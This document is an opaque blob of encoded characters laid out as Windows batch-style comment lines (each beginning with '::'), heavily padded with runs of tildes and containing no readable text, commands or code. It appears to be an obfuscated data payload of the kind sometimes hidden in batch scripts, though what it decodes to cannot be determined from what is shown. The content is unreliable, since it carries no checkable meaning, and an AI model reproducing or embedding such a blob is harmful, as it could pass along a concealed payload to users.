::/R!nqY,t5m8~~n{k1}oUl5XZ7d&SQ0w(u{]k/&oqp^a#v)|T{G1}VIo).]ZtEh+__1_^~J}Ut{!Q]Sh9Kj2+r/QEU-$(Fei/TOpItqz@g}U@iF~~GvY},#!z},vWQqi(zxCHp+}U^3Xf_Wbaei-@qVPh{Jb8YY#0)|b0}~~4e5d&SQ0
::w(Jl;k/xA&/QJJu!xnQr_T&O?ldkcN1oPOn2{TU&qKlBu/Qpnm}~oCS@C!U6/QJ&kGh.e?1aBO7$t(n?q(40(.]sQjqF=2aib50fk/&eNW^t0M},vItZAFDRmG^Mxq?acYC|3dr1^bTgwwT~+qdVZ8/Q+&/z9e8IMrxAD~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/QdhyI05#U_+lGQDj_;+~8INo).u[kI$9qHZz3H1k/ujpU.q^A7W.;A/Qd]z!xEx,k/Rg~k/Z4~/XfwcPyU.;qO/jqk/uj{CFHbk$hdSN
::IiO@$/QOmR.^gfSq?-!Zk/R;5qiuP&{r+4HVgj?+k/JTe^^tg&~~~~~~~~~~N,P50~4Nq{~~~~~~~~~~~~~~~~~~~~~~~~~^^^.^~~~~~RKd0l~~~~~IZ),~~~~~~nKj.c~~~~~i}G2J~~~~~Prg-,~~~~~gte3X~~~~~6NX#A~~~~~
::|}uhj~~~~~2}7x(~~~~~$^Ct.~~~~~ak4ga~~~~~rO8]n~~~~~fLLG1~~~~~+Z]i0~~~~~i}1]x~~~~~HkZ9w~~~~~VrX?M~~~~~!,9(@~~~~~/T{sa~~~~~zYndC~~~~~t^w7k~~~~~7TJO}~~~~~&o,du~~~~~h;/yd~~~~~fLnsg
::~~~~~5Y$R3~~~~~iE-{h~~~~~G{Wcn~~~~~;XN=8~~~~~!}++0~~~~~|}feo~~~~~2}_C~~~~~~Yte]!~~~~~#YKeW~~~~~RX]0I~~~~~S^nYk~~~~~fLwDV~~~~~yTjU^~~~~~Etq0=~~~~~wXm}l~~~~~HkL=(~~~~~VO{nM~~~~~
::[#Bz2~~~~~TXd={~~~~~3N@_;~~~~~#Y?-Y~~~~~h{1m+~~~~~Ct_W!~~~~~-Lb[$~~~~~?^K]R~~~~~wN~Z{~~~~~O2|I,~~~~~s#2)8~~~~~!,_!t~~~~~TX,&f~~~~~)]s(g~~~~~u{Q9q~~~~~rO={,~~~~~l,0OO~~~~~Cteq[
::~~~~~nX#3A~~~~~G{faE~~~~~~~~~~~~~~~8lu[s3C1tUWEhAoQ$vIYA7z[,A7TJ~cm__S3f^38~~GjwQ$vI^A7TJ~cm__S3f^38T1h4@)8yvi3f^38~~H[dQ$vI33fDK7A$tq5)3[sMts,_+.BI!MtEENI3L}rntMAg^9x^]{).O9l
::mT+Um2nTKE)2e.eAew$+)AURlts,+nmT+|tcap_xAew$+)AURltsypymT+z})c&~+WP-EQ)Pi&LcY.]].E626)c,]U)2KQeAKiD.A]EU3c.smH3wl5(Qe/zs3ggM2cv;I_2!J,k}o}5{cJH|kRRE2MQ]koJ9T}~h)lKsk9w(8xA$$Ym
::).H4Q/^D6VAK4YXc^x$Sc^Q58);PtlK3pvl}ov{Y)2etwAVm)pt-4+ZA7$BunwqIn}(=!W)2d5#WP-W(~~s;S/^VpV2+mlpQN3B+Aek1(.u7tr~~Pt=|=rBMcy@~?A]r}&9x^]{)98mA9QSJEcYmq+|=ri8c^A@?c^A9p9FcW)2!J,k
::~~~R|0430qAKS]nIoZxq/^&!Vc.smH)HElCt-V[Ay1b&DmFYd2c^A5UAK1#^Q@it=|ZXEI|nl7{c^qy,W}|$=QKEWj2];H{9|Z(]3CMY~)sFTS7Y7uxTWEEp9|#89c^x@5tqLIK9FtIH~~HhwQe/dWt,U61caM&ct#(r+~~sip|nKT$
::Ae5$m|nl7{c^q?oWbD#p9FtIH/&FKOW}2SZ|ZXEI|=_4q9w(PI|n2HC)2K],Y69GvQX@W5W(Fdfcv;_-tEmuLY5Tn~QX@W5WbP,{c&KKlD]1]4m~6Yft-8&ycuoCqc&KKlQr}$q|ZXEI|nl7{c^q?EAeniP~~P4)043+dc^3HKA7~Ng
::AVV#GAKDtEAe~9p3wldk043+dc^3HiYGy8zAUaxRAK^S4)AMo[~~O&M|=o_gAKS7_9QSJEcY}Ex|=rUzca(|v2!J,k}@bzmAVZ_]S{Py#}j#y&c&K)dt-8=L9QSJEc^9fZyCQzGmxvrq|=_4q9w(rF3U$p=wwCD0|nl7{c^q?EYG&Ti
::;kW7lTUiQL9|R0I3U$p=A$$KT2ZzTDDy$.z~~8|)/^g(|c&^rE}(=#J9F0R@RToJZQe|H=c&K-4tEyxw9x^]{).8uU/^VpVWP-W(|=_4q9w(rF3U$p=C5;i~A$NH@tE/Os~~s.KQ$vI$cabVHtZH7u)Lq[TWkEBf9wC|H)AE!p$;WmC
::}j{FJ)LqPEc&K-4tEyxNc^q9PtE7XB3RtD3Q$vIt3fDrOcv;Dq)Lq[TWkEBf9wC|H)AE!pVNc,y2Kzye}(4acQe.YS3f^R9}(=)=3f^$mAKuNjUi2-d2dAZ#AekvTcv6aYcafkxcafdkt,UHd}n_f0/^V!cz8YD$c^A5UAKV5{9QX#d
::9xK^J#iBnwmTnCn3CC9HD]}v!)8/,8~~s.+@rOpOA7T^(AbK[gQ$vI$cabVHtZHxJ~~pM]Q$vI9cm&b.9FtIH}G|9JW9fQZ9F0R@Rks222eHHhQd5XuQe.YS3f^R9}(=)=3f^$mAKuNjaYx?M2eHHh}(4acQe.YS3f^R9}(=)=3f^$m
::AKuNjJt#uQ2eHHhmwnZ53sJzj)Lq[TWkEBf9wC|H)AE!pRTY!c2eHHh|Zi_K3L}#o)Lq[TWkEBf9wC|H)AE!p|4jkY|ZXEI.BLc$;j0-,}ov{Y)2e;xWER]P043+dc^3Hk9Q=4(.BLc$ji/gaQe|H#9Q=4(.BLc$vZl.D2dwWxcvTxl
::9wW,+QK,P?A7HF={.GpW}@viVt#(r+mTeeB~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~OpHgs_!8Sjud~~~~~~~~~~~~~~~~~~Op~TT;p
::X3Q;4~~~~~~~~~~~~~~~~~~OpG,|MV/1wxn9Pr$pU.q^A~~~~~~~~~~~~~~~~~~~~U.#WG~~OPpQo=DsTRWuNQ@XxF/YQZd|HyRO/YQ$Cm$@6{~~~~~SLdN4~~~OpU.[wv~~~~~U.[wv~~~~~M}8oL~~~~~p./vs~wwTOG}BL8~~~~~
::~~~~~7gGSZ~T@Ob).OzStLZGZts-2OtLqw=cYM|PA@U/$AotfQ0v#,;~Tze&!S^6X6T!LM!SJ(fX3Q8vt3X|j~T0]eAo)xaAb{QYA@UFl|HySHAGe1]~~~~~Qoq823wSyaA@UfhcY}LZA@Us)2S7qxU.6(yU.}^CWMbNeDCSF,WEx,C
::tLZGZ).G-u3Rt(R9D(;A3wrK,9KJ3]AG{u./C^W4~T0&+tLqw=cYM;bcY}C#9KJZ=tLZsu).Op^Ao)h^~~~~~|Suq.Ao)/]cY}C#3wrTImXPvBAb{_aAo)ejcY}LZ~~~~~DgG-a~T0&+tLqw=cYM{[cY}LZ3wSyaAo)h^~~~~~XLj;6
::DCrrg!HF|a[b5@e~T0r-A@UfhcY}LZA@Us)2S]6!9D(g3cY[S!Ab{yhAo)/]cY}w^AbI$53wl]C3wo!@)?Rw-~T0dycY}@29D(;A}ZAOsAbfVL3Rte&tsE^))/b|9}ZAOsAbfVL3Rte&tsE^)).~3LgnCJmVX8]5.La^P3Rt-^U.M|0
::)^@]I3wSyaA@Ua^)?oBx9KJXtU.BUw6T[H0[@MTD!Hk~V!Hk~V~~~~~MvA[,~T0,F3Rte&tsERWA@Us)2SYistLqw=cY}^79D(g3cY[S!Ab{yhAo)/]cY}w^AbI$5Qoq823wo!@}6Pa(~T0iw3R2pjc1iLu9KJ^Z|HySHAGe1]~~~~~
::|Suq.Ao)/]cY}C#3wrTImXPvBAb{_aAo)ejcY}LZ~~~~~X3Q|R~T0iw3R2pjc1iLu9KJ^ZTRY_[3R2V_tLZH#A@4h|XLj;6DCrrg!HF|a}nr[e~T@VG9D(T7m$9gH2S7GY/YTRVcCvL=~~~~~1v]w]~~Gkb3Rtq7A@UIj2S]EA).Op^
::Ao)h^~~~~~G,9]/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~4Nq{8Sj#.H0x&e=yw_~MCsub|?TY&~sZjF8Sj#.|yI.53!FKJ#7D09hfc-U~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~tYr@J~~66PXa!YvpiEC}/Q@57~zH_~7N~nt7N~_e~T)yCX)_6,9pF[vcYZH|
::~TnYR0v(ZCpipng7nTL6p7c=A.79meOmCQSp.);M~RLKCG,![V^3=(571+/jX)_6,9pF[vcYZH|~TnYUU3xJ[!TI2SLdz.W=f;[4r8N[e]@oZ|N$bXdpZ811H(5N{z0Mz!AIvfWzVKRk~TZT.!tm2^uI@((tZ=hU-E|_L~~H}QPXdUN
::=V]4yPX}7Qp^J}gZ_=yFG,=$6p.?q9TA(JCXWU$-TTZ&9OT=hRtuA@k)AEP#H[B&bp4G]D4;+3Yc/vmHc[11o;~v=)p|0eR.-e;jAKSnD)T3F+3C0wQ9T@BPAAzUs[@5mLp.^Q5.-e;jAKSnD)T)h~A]drX)~U)FtErL1|NytdWiG],
::AD{3[cab^B}JQ+qX7uz|;oG/9X7W||!f+~)!1!{E82L1aX7f2zXKlkAXKR057RxhiX)miCTTZ=0~LLD&4D!pHp4G]X4UVK=)8K.;t}/4XXf@G$pim5VG/m0@c&?jwA]f]2XY|.~TTZjt4+w2u3C}GQc??VIAK^K/3{{48AKV.-X$tz0
::TTZ2Q!D[],3C}GQc??VktEm]pWtBE(9T1yH9T1iP}o}N_9T@6,tEP=;WiGFU9xKfpt#b6T7C&H=PXdUN=V]4yPX}7!p^ajx~z?D{7Cv[r7CuEuhecZuZ,^9L|eAV1TG3{jXT0TO;n@$qwd|7xx.L[B.goNiFi@y]pKSizY2Yx@/HnYu
::9MkI#$J62KV~^T4P(-pcIOQzFZWwFrW?@w-e+2qZaKUOR4r_|;e/vB_5]}!pf/tR]iw|=;OmjEanG^+r1nnXBwzpgb5;4@dL8$u)}DNb}Ss0ZkvmY+QQ&3d7Np^IbQVn[GR}=6x&IC.qh#&^Amf=XJeNi.6[x_mo/T6jsNbK#gy_h&(
::7-8v(ptwYydhD5]W0,2Ciq~}+s8vIM|Rx9oK0Q|{yOdROHf{oL)!y6H7+fmApmtT/y;L-!nb=I@Gl{VH~RwY4~qfM]lW8}@SVfT[p4O@KpQnNVpib5f~TL)^[r^R5piClL~TnR6~k|B(pim5WP$,#q4RV~)@H4z-n[z}xIjPJnfMgX-
::#04$/p4O@&pc8|QJdo(sXepe8pim5VOu#jRt-s!P)suoBUcowK3{{48AKXxz|5O0n)An|pt-s4.81g)1p4G]g4UYSvX7u)9VE.U2!fN{0;kqN];@(_8XWSXv9TH6GhvHzeU{gjou|g))Wy&X[Xvr=OT@6V{A8?LotF^U6cx#SV)3A]I
::XDPZyW|,LY9wC=DAezsA9wY6Q31XXU3g~rt3f,24t-s!P)suoB1wVDJtEm]pWtMHCXZQIp3fO]#XqE!b)3?DKX=$fF31^R;A$]XrX=71u!18]QXe(9-3f,)_7YCt!pipE[G}znV)h]-53To_~pipE[GQ@B}ca@!g3H?j;Wt_}LAD~=G
::AKSnD)zF4cA8K5AtE9k6XBa&})3.;Xt-s!P)suoB1wVDJtEm]pWtMHCXZQIp3fO]#XqE!b)3?DKX=$fF31^R;A$]XrX=71u!18]QXe(9-3CLbApim5W4;DV}p.=mRX)_6,Vhl$$i2Vg8O#OqB7CuEu[h]f-,XOsRu(c+7RKY4z/k=(T
::TPogqZ2Op4TF41a-^,]r0Z!xTnts3icAAd(jffKL}7)/(LzFm|rsDd;}]1!]}(e[&u|G0-y]eBgJ.X0/8Ve+.NK=$2[x1B?J}NaBIT8nMzQC(~=^?VK4Ws{se~{II=J8|HV(+Iqn|zhgQ+lWeWY!ZOfT|XVE9mAscI1,~p(B}8@+I]C
::@-X&lq45D{oF}bpxr-{Zo|-|H9ZUFZpd9Dj,HrO{v+V~,Tz/[K/Y/!]#LfEH4T8lV8[d}KmLbc;{DPnOGT]G2eVfA555gJ(c+|qL-q!fY|h0Jof]-uoxl&~2XaX7eXaXA$^30Mw~RnlQOLIG2~~~~~GFbe,GF2rG=cs1j~z$H[Xa1Om
::Oax--p4G]V4;QXBXfoMvpim5VGa&uY9T};wA7U4XAAQ_xP=;G/p|Ga)Q]ktJAKXs@;__vTp4G][41zMJ9wC=DAezs}}om~{AK^.VtE9EA!18tdp4G]U4VYjn9wC=DAezs}Q$O7FU9tl_)AM@O9ik]5U9!gEtvPi;)3yb{X7um/;oG/@
::!18#06H6.Y6HTZ(82L1hX7-=A!12d]!Y/uE7RQW,X)miCTTZ=0~LLD&4D!pHp4G]X4UVK=)8K.;t}/4XXf@G$pim5VG/m0@c&?jwA]f]2XY|.~TTZjt4+w2u3C}GQc??VIAK^K/3{{48AKV.+X$4UQTTZ2QX[}V53C}GQc??VktEm]p
::WtB,UtuA$(UcC$e)3ybwAK4Y6A],lgU9c)Q!18)TXaXT=X)_6,Vhl$$i2Vg8~TnY;7CvclXaXTB~e=)&~[YHT$)UudXO{-iy3q|iJW;KO@T/5V7ja|boQtHwt;en^OT5.~h!QyZX4t8~r9IUC&G0H7jTzE~L1R]z;[R^w&F!J~EeCUk
::Slh@Hlj/(H]#hAq|!&^TQ+K&~ssE~M&DPDL|;Zn!FH|ybBzT}E#2,u#]FzOz=|?Ym-IdJxNMf3B|.!.,,P^zjeqtR,fu9L&l~D18p+.H8~@=AO8br5XP]4y7[KYAD_V9k].LrlhO3jDR-5[@H4.M;a,!{svEz9[BH9vm+{AIgg|e66P
::}Nn-jv1I8D{/Z#Dvg_./Fn($S~&B~|GqMf;,r7F=VR64!zelpxqoZ(S~~D5Y~27u,~2Hm=piEd{~TL)^[_C0w~kD$4XY2@pT@[uu84Wzr3qyaFk8Jp1WGsGpgnNb14~Or0sOJt(pipng7nzc)p|vzh~snE@~UWiF~4w|Ypim5WPN6pQ
::~ReOXPN31.;0/WawwL$o~kHYHXYJ$OT@6|e8fCIJ4_[yjf38-S0r+t?BdQPBK@^NPLPh6wp4O@LpcllWXqc4!^=jL;tva@/6_Zgw3f,9)t-s!P)suoBDy/N|XM(S9XB^OzXM(wqc.A28)plmP9?9ML}h!|8)Ll(WX7umMX$8=T!W6Xj
::2f^GkGxgsrpJ116~TCV#.7t42GxgsrpJ11f~ew,u)3A]IXDPZyW|,LY9wC=DAezsA9wY6Q31XD99Ft_H)plmP9?9ML}h!|8)Ll(WX7umMX$8=T!W6Xj)0UVVGF2rG=cs1j~z$H[pUN&^~;hm,NTcUWPBBcfl2~W^r4aJPteUtuI]hcO
::@dSH$92K|UDwxK[?MOJ;h?_8;,4EaTNk~2=tEW7ccK~r[ENzC+/cy~Zs+0st6K#hFAViD)EmWB_eH5h~S5@4EAc+}=Ij?KAt#^,bm(SfG~3&jrfA!ovX{lBs|@&U}@NxB=6c~_CJ8fT@;Ez|!3)txn{.EEBYk8DT1nn(VOWg3Ri&C]]
::{5&d0lgsukGyBU1owyT/Q56=5@K.q3g6}Wb[vaQsl9r14t$r6W?hgS$UFSvg89kbSpV4&T=a7KJ3tZ~(=4HMG?E)@R]Wy)c,)^T7Kt-@vdc-rcx(#!e97ugMt2l-f+0Em6#6nf9[{D/m9lk5-?cq@_3S_nTYb7w=ciD6Hslu~]qD@]}
::~H~lN+!NrNI&gE/l!0s!y-4jP&1oP6=Hh4[9j_ny~j,JELk^gOBR5-c|fE!UO9a3[zbr1FQapqKU33$myfFR5~K^MpG7aTO?_3Onrg(c(oa/FYM4Wso~!}K.j}uaux.+6Ht,!6b477lZMi15BSK]oGqj2+uc;V|F={/~4PB{Z[5[UcC
::j]N&36t=ZwAWh;!]/R1UYyb$dPBMtlz7y?yB{qdp)@{X;504=+~6l}odEkRbc&2p!yCO93NV_D;08h^GUGD@lWQUJL3wE92Xags^7RQW,X)miCTTZ=0~LLD&4D!pHp4G]X4UVK=)8K.;t}/4XXf@G$pim5VG/m0@c&?jwA]f]2XY|.~
::TTZjt4+w2u3C}GQc??VIAK^K/3{{48AKV.+X$4UQTTZ2QX[}V53C}GQc??VktEm]pWtB,UtuA$(UcC$e)3ybwAK4Y6A],lgU9c)Q!18)T~hr@n~~Hm|LgGLi&S-wJ~~~~~uxT#ZOpD$h~Ws@.~RLYs^&5mpsOJtk=V]4yPX}fQX{y}y
::VN@pR~76}6~Tf8wpib5f~TL)^[o{~KXf1EWpib5f~TL)^[o{~iX7Tx|Vhl$$i2VgXp0qs4UvIJMScHN{[QIw/5Su!2B5H,uwa]OBRZF=9XBv&/+2F/GOmCQSp.);M~RLS{!fl_jH|fM5|Suq.Ao)/]cY}w^3!y04;14W.3gpHyX}Ix{
::D?bQotE/O83C1TP)pJk9A8EA4GF2rG=cs1j~T3@8pWgjax3HVrjnRv}gsN!C4z,800+gk#UQb/^;N@Ty4]iwQ=a-e=^+7Uw|N4lrK=|o?dfHTc4}y,$^WZHAD}vo8-e^G^wK=UmMJAz0w~CQB]t{h#HAlI/83qtB,dgLb/!0Cx$52D!
::$j49$NpIHP9y0uwE#RxDR2g!T9+xdQ7}![9;U-_XSfw+Zw~PqY4@EfKm_DWEWz4/4P{6b3Zn+W/g&-1loUKeh1u|UXtwk59K6caHw1cMu_dU6,gO?FFRqjCRj|#6LO-jYL-@_w;4KqmUj&&de]~wZTMzD3@YY]@oMGbUeBzHVq_FYYB
::}~AG.25rJQ!5o0;^y6iYXaXw8pib5f~TL)^[o5gIXy=PyXaXFnpiEC}/Q@57~zH_~7eYXo7eYO8~ThPeX)_6,9pF[vcYZH|~TnYR7CaN^OaO,P=cs1jGy&U@^&,[6pWghzXaXTe~RLTUOmCQSp.)XhO6=QIXe{P9OpD$h~Ws@.~RLYs
::pTf])30~mdm~u2qBcreC^1+.ZqGUD0}u)7aPS^BOTCyY7@^_u+q9|zm!18]QX$25t!1!j)!CgNt!N[&.7gGCA^&-JN7lYXHCm?__G,=$6p.?q9TA(JCXWU$-TTZ&9OT=hRtuA@k)AEP#H[B&bp4G]D4;+3Yc/vmHc[11o;~v=)p|0eR
::.-e;jAKSnD)T3F+3C0wQ9T@BPAAT&?g#4ovp|W-C.-e;jAKSnD)T)9bc^ABOtE9,!Ucd[E3CCBtQ7tRoXd_appim5VOu##rt#ulN)~U)_QSyqg|g8d4}FHrw!Y9Lv!CP^nXda=bpim5V~(bh$t-s!P)suoBUt6HEcqOnH9Q^kUQe.b,
::t-8I]7d(!H7C({G7C5nP~kD$s~hr@n~~Uo8.Nvi6cqS(o~~~~pDq]xTGF2rG=cs1j~z$H[X&uaIX)miCTTZ=0~LLD&4D!pHp4G]X4UVK=)8K.;t}/4XXf@G$pim5VG/m0@c&?jwA]f]2XY|.~TTZjt4+w2u3C}GQc??VIAK^K/3{{48
::AKV.xX]gnsTTZ2Q;A=}j3C}GQc??VitEV3MQKEWf3OV(3MiVi|Xef|H82LsoXe(]AX7u|0X7Ew=PM$jE!W=NtXe-#0!N[a{Cm?__G,=$6p.?q9TA(JCXWU$-TTZ&9OT=hRtuA@k)AEP#H[B&bp4G]D4;+3Yc/vmHc[11o;~v=)p|0eR
::.-e;jAKSnD)T3F+3C0wQ9T@BPAAT&?g#4ovp|W-C.-e;jAKSnD)T)9bc^ABOtE9,!Ucd[E3CCBtQ7tRoXd_appim5VOu##rt#ulN)~U)_QSyqg|g8d4}FHrw!Y9Lv!CP^nXda=bpim5V~(bh$t-s!P)suoBUt6HEcqOnH9Q^kUQe.b,
::t-8lV7C&H=PXdUN=V]4yPX}7!p^ajx~z?D{7Cv[r7CuEuR)|eh)_URSmMx$r/9jx}Hn~{7n/Ge5O,eXtR=HVCXZ-]g1+jD/5BbeAzV(8~yM,hO]0lfOKgpIsVoY7lqP=YxTClmB3CBWKEi|g.p?TE=1tXTy@tJ/AUT.?.a7PsY)ey,l
::MacnC1vU(jh9!Sp.fs3$caW#0km-ln}DL@&9|7f@UquEc_{PkYtdOyiB|uo,1b[I{rI?.~x]@kYXPN(w!L!;h4q40ih=sm/GHNvj!S(W24&C#P2SKi}MfU=Qo~MNuciT99V_MJ3_6F8^Iff]E=;$yy-(W{brY3${f[2Qt)7wtJdjstD
::dv{9hwH~7R9DCA7~RwY4~qfM]sIC538WY5}p4O@#pQxUaK-f[Y}6D/s|83XSX!6Y!yk(ZrXYJ$OT@6|e8fCIJ4_g_a0L8m(?Xr-umZ.THtZNU1TcmWjp4O@LpcllWXqc4!^=jL;tva@/6_Zgw3f,9)t-s!P)suoBDy/N|XM(S9XB^Oz
::XM(wqc.A28)plmP9?&DoQKEW3}J04mX7umMX$!&QXevkx2f^GkGxgsrpJ116~TCV#.7t42GxgsrpJ11f~ew,u)3A]IXDPZyW|,LY9wC=DAezsA9wY6Q31XD99Ft_H)plmP9?&DoQKEW3}J04mX7umMX$!&QXevkx)0UUgp4O@^~TZ64
::~_{JV4;_uz;9!NkX)c~nVN@pjpJ01/X)_6,Vhl$$i2Vg8O#OqB7CuEu]Q/iFi7VCmlnG+ML}u#PyZ50q/dDZ)wUj2iA^MO]#s(0]Y(F[m}y2+eZaT[k&N9G]V@PVg]o(!Xp;Bje]U~rfQIkF=cwLshsmEq6EYIclKB$Fzz}?H9#06Xd
::lflD+XHqk#s)x;(zEqNPTuLZgZh?-Ayhptgqr@tj;zPLcDYXG1UFM0mZ+-L//elf{HS]EBA=U!?u_.2AJ9OlynO0r8hg17&-bQRuihaG|zLQ[MSqT8z?ruM7jSY8|=@fWIo}H&Qrz#?hqRgt?-Z(m_fe,OGcS&zyg5UlZy3WDdI@p.R
::uJM+,+FtE-G(Sp/=9LuaBbV8dXaX=$XaX)!^30Mw~RnlQOPjvU~~~~~~_fHKGF2rG=cs1j~z$H[Xa1OmOax--p4G]V4;QXBXfoMvpim5VGa&uY9T};wA7U4XAAQ_xP=;G/p|Ga)Q]ktJAKXs@;__vTp4G][41zMJ9wC=DAezs}}om~{
::AK^.VtE9EA!18tdp4G]U4VYjn9wC=DAezs}Q$O7FU9tl_)AM@O9ik]5U9!gEtvPi;)3yb{X7um/;oG/@X7W)0Xe(]0[A,@F82L1RX$!r@!1!JA[sau-YyC~IG,=$6p.?q9TA(JCXWU$-TTZ&9OT=hRtuA@k)AEP#H[B&bp4G]D4;+3Y
::c/vmHc[11o;~v=)p|0eR.-e;jAKSnD)T3F+3C0wQ9T@BPAAT]E1&U@Zp.^Qj.-e;jAKSnD)T)#kAVu|()2tO;Ucf3-U0uR;X778oU(kY!GF2rG=cs1j~T3@8pUN#{~HX~;O6Wer~Tts0PA}Ekq3[,YwpW)nF=TBA2ZZqeehZ^v7F{;+
::Y(oD8@CtF39Ar[kMPoT=yVe-=p0=b{sS)(lC6hD3Ykyl6hFavxy&VXUT4FsW.(6VNoJ6$6j#IWYz~nZ?m!]RD?N{ajl3d[tz2zx+z9_;O$Y0MAt.@uuT6{CM.^,}!xYFaj4MKMTsh?1TSc]HimIiW,1_]{!st-~c.BREJ9lXMQW..~Q
::z;|Jjq)8OHQ|1?3G~vr=?-8bcv|g[5CF)z^5d#0kR|W}{O/qH8|4vn+=lM,PW^Tku&3r-RX!T2=?_Tb5JS7|aO4^xhwB$+e}kjUma1nd+1GHU9~TTVF7Ch~K7Cj5fHgL)-pipng7nzA)p.aSU~H1A(p4O@#pQxUae&=j)qA|B{}r#[q
::s?jJY08iKyXW(4OVN@pR~76}3~jH?vO6B~s)^0-Z}ZtAUO#gSM;zn/J~kD=jX)y@nT@[I&~RZ.UX3xzxkpWZ~p4O@dpQnNV7DOvgT,gvKJXqD9d}6IJ0qPD+8waUDpim5W;k09y.eSMM/hcaVmQgdf3H?j;9wCtTAD~=GAKSnD)zF4c
::A8K5AteZ(|2f${7AeU~G)3.;Xt-8PoA{asx}Om.x!18)|Dq$8m!12#,3f,)MpiClL~TnR6~T3TbXq)D,piClL~TnR6X3v(,tva@/6_ZV!Wthoxt-s!P)suoBDy/N|XM(S9XBa&})3.;Xt-8PoA{asx}Om.x!18)|Dq$8m!12#,3C{~d
::^3h$b;@h9LwwdyTXa1t97R2~cVN@pR~76}IpG1|RX$KJWVN@pjpJ0sX81.$3)Ak/?X}Ix{D?0TB3C}GQc??h/AKPV8.!ld]Ae~nc}xiSmcmS9S)IEVutvas)M&P$3pipE[G})w_!Le2i;T/fMcY}@29D(;A@ZTyHAo)a&tLqR2WEx!#
::Qo=y09D(t=cY}v]cY}^7).~i.;c9i1GF2rG=cs1j~z$H[pUN&^~~+htQPQ#snXoLr3Tc9iJaDn=oNB=B?e)[1pECZ_FYPq#Xj7j/tOpK)iG-N+Sb&82gXUN},QGrHGxDC8}-S2gQn7w,@-a@@fRy3oa8F}fk4McU8YP&;TI]v4}B+Mc
::l##mvyn8bGM.X}lW(#[k~6_@,8_$W17a~Z}rQB5ACqGA1~1-={},ZkzCN|+[vt1D(Sj]fcnWfA3/N5&Qh|?,L5C[VD9JWahzOoO@C2H|UZQ,jP7sD8.OSbdF6J9xJ3)hudULM1eJa.,]]k,x(#3dj0dCOIE;RVy=u-Q(EO2})tSFgV)
::p99{Zrz)I56O0J^5ldLu?hMnfzjz^sDnd~xJ[d!Qq9h#o_,I$$f)mHy/pU(]d;/$/,k^njntsGC+d80-UiIR[hhotolP8PS+wCl~J,~-}c#+pDi?OL{ih$F09Qte;R]L}5O;}D~,s]}O$~S&2;x@5F~@vdNsn}PA6#[E2{|[VQYc@v4
::G5V=UEc{ljDe^RUlf/hmUyk4o|0V1Uosv$AoAJOL{5!+5|G=dPVr,U3c+ISW)0@qY9kd,|qAGi+UNMPxh!b3gvxI_&J~Nyr58r9#I.F;yIGQ=0|H02m0bXlJ;o}i5Sr4rLX8Xmt|C}(FGFOI2or#fvGe7I7Njtq5+$Bv)H(k,hdugma
